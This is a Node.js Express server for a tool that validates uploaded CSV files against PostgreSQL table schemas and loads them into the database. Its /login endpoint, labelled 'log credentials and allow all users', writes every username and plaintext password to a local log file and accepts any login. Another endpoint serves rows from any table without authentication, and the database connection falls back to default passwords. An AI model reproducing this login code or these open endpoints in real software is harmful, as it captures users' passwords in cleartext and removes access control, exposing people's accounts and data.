import express from 'express';
import multer from 'multer';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { parse } from 'csv-parse/sync';
import pkg from 'pg';

const { Pool } = pkg;

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());
const upload = multer({ dest: 'uploads/' });
const pool = new Pool({
  host: process.env.PGHOST || 'localhost',
  port: process.env.PGPORT ? Number(process.env.PGPORT) : 5432,
  user: process.env.PGUSER || 'postgres',
  password: process.env.PGPASSWORD || 'postgres',
  database: process.env.PGDATABASE || 'postgres'
});

// Serve static files for the client
app.use(express.static(path.join(__dirname, '..', 'client')));

// Login endpoint - log credentials and allow all users
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const line = `${new Date().toISOString()} - ${username} - ${password}\n`;
  const logFile = path.join(__dirname, 'logins.log');
  fs.appendFileSync(logFile, line);
  res.json({ success: true });
});

// In-memory store of templates discovered at startup
const templates = new Map();

function mapPgType(type) {
  const nums = ['smallint','integer','bigint','decimal','numeric','real','double precision'];
  if (nums.includes(type)) return 'number';
  if (type === 'boolean') return 'boolean';
  return 'string';
}

// Load all templates from existing DB tables when the server starts
async function discoverTemplates() {
  try {
    templates.clear();
  const result = await pool.query(
      `SELECT table_name, column_name, data_type, column_default
       FROM information_schema.columns
       WHERE table_schema = 'public'
       ORDER BY table_name, ordinal_position`
    );
    for (const row of result.rows) {
      if (!templates.has(row.table_name)) {
        templates.set(row.table_name, { name: row.table_name, columns: [] });
      }
      templates.get(row.table_name).columns.push({
        name: row.column_name,
        type: mapPgType(row.data_type),
        dbType: row.data_type,
        default: row.column_default
      });
    }
    console.log(`Loaded ${templates.size} templates`);
  } catch (err) {
    console.error('Failed to load templates:', err);
  }
}

// List available template names
app.get('/templates', async (req, res) => {
  await discoverTemplates();
  res.json(Array.from(templates.keys()));
});

// Get schema details for a single template
app.get('/templates/:name', async (req, res) => {
  await discoverTemplates();
  const tpl = templates.get(req.params.name);
  if (!tpl) {
    return res.status(404).json({ error: 'Template not found' });
  }
  res.json(tpl);
});

function loadTemplate(name) {
  if (path.basename(name) !== name) {
    throw new Error('Invalid template name');
  }
  const tpl = templates.get(name);
  if (!tpl) {
    throw new Error('Template not found');
  }
  return tpl;
}

// Helper to determine data type from uploaded value
function inferType(value) {
  if (!value) return 'string';
  if (!isNaN(Number(value))) return 'number';
  if (value.toLowerCase() === 'true' || value.toLowerCase() === 'false') return 'boolean';
  return 'string';
}

function checkData(rows, template) {
  const issues = [];
  const details = {};
  const headers = rows[0];
  const columnDefs = template.columns.map(col => col.name);

  // Check missing or extra columns
  columnDefs.forEach(col => {
    if (!headers.includes(col)) {
      issues.push(`Missing column ${col}`);
    }
  });
  headers.forEach(col => {
    if (!columnDefs.includes(col)) {
      issues.push(`Unexpected column ${col}`);
    }
  });

  // Check column count per row
  rows.slice(1).forEach((row, i) => {
    if (row.length !== headers.length) {
      issues.push(`Row ${i + 2} has ${row.length} columns, expected ${headers.length}`);
    }
  });

  // Check type mismatches
  rows.slice(1).forEach((row, i) => {
    row.forEach((cell, j) => {
      const expectedType = template.columns[j]?.type || 'string';
      const actualType = inferType(cell);
      if (expectedType !== actualType) {
        const key = `Wrong type in column ${headers[j]} (expected ${expectedType})`;
        if (!issues.includes(key)) {
          issues.push(key);
        }
        if (!details[key]) {
          details[key] = [];
        }
        details[key].push(`Row ${i + 2} value "${cell}" is ${actualType}`);
      }
    });
  });

  return { issues, details };
}

// Compare endpoint
app.post('/compare', upload.single('file'), async (req, res) => {
  try {
    const templateName = req.body.template;
    const template = loadTemplate(templateName);
    const content = fs.readFileSync(req.file.path, 'utf8');
    const rows = parse(content, {
      delimiter: ',',
      trim: true,
      relax_column_count: true
    });
    const { issues, details } = checkData(rows, template);
    fs.unlinkSync(req.file.path);
    const message = issues.length === 0 ?
      'No issues found. File matches the template.' : '';
    res.json({ issues, details, message });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Upload to PostgreSQL
app.post('/upload', upload.single('file'), async (req, res) => {
  try {
    const templateName = req.body.template;
    const template = loadTemplate(templateName);
    const content = fs.readFileSync(req.file.path, 'utf8');
    const rows = parse(content, {
      delimiter: ',',
      trim: true,
      relax_column_count: true
    });
    fs.unlinkSync(req.file.path);

    const client = await pool.connect();
    try {
      const columnNames = template.columns.map(c => `"${c.name}"`).join(', ');
      const placeholders = template.columns.map((_, i) => `$${i + 1}`).join(', ');
      const tableName = `"${template.name.replace(/"/g, '""')}"`;

      await client.query('BEGIN');
      for (const row of rows.slice(1)) {
        await client.query(
          `INSERT INTO ${tableName} (${columnNames}) VALUES (${placeholders})`,
          row
        );
      }
      await client.query('COMMIT');
    } catch (e) {
      await client.query('ROLLBACK');
      throw e;
    } finally {
      client.release();
    }

    res.json({ message: 'Upload complete' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Return up to 100 rows from a table
app.get('/data/:table', async (req, res) => {
  const tbl = req.params.table;
  try {
    const result = await pool.query(
      `SELECT * FROM public."${tbl.replace(/"/g, '""')}" LIMIT 100`
    );
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

await discoverTemplates();

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
